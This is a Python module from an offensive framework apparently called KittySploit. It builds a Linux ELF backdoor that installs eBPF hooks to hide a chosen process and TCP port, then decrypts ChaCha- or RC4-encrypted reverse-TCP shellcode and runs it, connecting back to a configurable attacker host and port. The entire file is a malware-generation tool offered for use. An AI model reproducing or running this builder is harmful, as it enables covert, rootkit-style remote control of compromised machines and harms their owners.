#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
eBPF-assisted Linux evasion loader.

Loads a minimal BPF program and rule map (hide PID / TCP port) before decrypting
and executing embedded shellcode. Requires root or CAP_BPF/CAP_SYS_ADMIN.
"""

from kittysploit import *
from lib.compile.backdoor_helpers import option_value
from lib.compile.ebpf_evasion import EbpfEvasionBuilder
from lib.compile.linux_backdoor_helpers import build_encrypted_elf_backdoor


class Module(Backdoor):
    __info__ = {
        "name": "Linux eBPF Evasion Loader",
        "description": (
            "Generate a Linux x64 ELF that installs eBPF map/program hooks to register "
            "process and port hide rules, then decrypts and runs embedded shellcode. "
            "Root privileges are required on the target host."
        ),
        "author": "KittySploit",
        "platform": Platform.LINUX,
        "arch": Arch.X64,
        "references": [
            "https://attack.mitre.org/techniques/T1014/",
        ],
    }

    payload_path = OptString(
        "payloads/stagers/linux/x64/reverse_tcp",
        "Payload module path (raw shellcode)",
        True,
    )
    lhost = OptString("127.0.0.1", "Connect-back IP address (reverse payloads)", True)
    lport = OptPort(4444, "Connect-back TCP port (reverse payloads)", True)
    encoder = OptString("", "Encoder module path (optional)", False)
    hide_pid = OptInteger(0, "PID to register in BPF hide map (0 = self after fork)", False)
    hide_port = OptInteger(0, "TCP port to register in BPF hide map (0 = disabled)", False)
    cipher = OptChoice("chacha", "Shellcode encryption type", True, ["chacha", "rc4"])
    sleep = OptInteger(5000, "Sleep milliseconds before executing shellcode", False)
    output_name = OptString("ebpf_evasion", "Output ELF filename", False)
    optimization = OptChoice(
        "ReleaseSmall",
        "Zig optimization level",
        False,
        ["Debug", "ReleaseFast", "ReleaseSafe", "ReleaseSmall"],
    )
    save_source = OptBool(False, "Save generated C source alongside the ELF", False, advanced=True)

    def __init__(self, framework=None):
        super().__init__()
        self.framework = framework

    def run(self):
        builder = EbpfEvasionBuilder(
            cipher=str(option_value(self, "cipher") or "chacha").lower(),
            sleep_ms=int(option_value(self, "sleep") or 0),
        )
        ok = build_encrypted_elf_backdoor(
            self,
            builder,
            build_source_kwargs={
                "hide_pid": int(option_value(self, "hide_pid") or 0),
                "hide_port": int(option_value(self, "hide_port") or 0),
            },
            output_name="ebpf_evasion",
            save_source_name="ebpf_evasion.c",
        )
        if ok:
            print_info(
                f"Hide PID: {option_value(self, 'hide_pid')} | "
                f"Hide port: {option_value(self, 'hide_port')} | "
                f"Cipher: {option_value(self, 'cipher')}"
            )
            print_warning("Target must run as root for BPF program load.")
        return ok
